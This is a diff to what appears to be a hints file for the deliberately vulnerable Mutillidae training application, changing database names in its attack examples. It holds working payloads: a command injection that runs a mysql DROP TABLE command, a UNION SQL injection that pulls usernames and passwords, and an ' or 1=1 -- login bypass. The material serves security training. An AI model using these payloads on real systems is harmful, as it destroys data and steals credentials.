@@ -519,7 +519,7 @@ Cover Tracks: Clear logs
 
 Convering Tracks: Database Expolits via Command Injection
 
-	Linux (Samurai): 192.168.1.1; mysql –user=root –password=samurai –execute=”DROP TABLE accounts” owasp10
+	Linux (Samurai): 192.168.1.1; mysql –user=mutillidae –password=mutillidae –execute=”DROP TABLE accounts” mutillidae
 
 Recon: Explore Database Files
 
@@ -592,7 +592,7 @@ Recon/Scanning: Get specifications on database software
 
 Gaining Access: Extract passwords from user table
 
-	Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+	Value: ' union select null, mutillidae.accounts.username AS username, mutillidae.accounts.password AS password, null from mutillidae.accounts -- 
 
 Maintaining Access:
 
@@ -925,7 +925,7 @@ Value: ' or 1=1 --
 Page: user-info.php
 Technique: Indirect SQL injection
 Field: username
-Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+Value: ' union select null, mutillidae.accounts.username AS username, mutillidae.accounts.password AS password, null from mutillidae.accounts -- 
 
 Page: login.php
 Technique: Blind SQL Injection
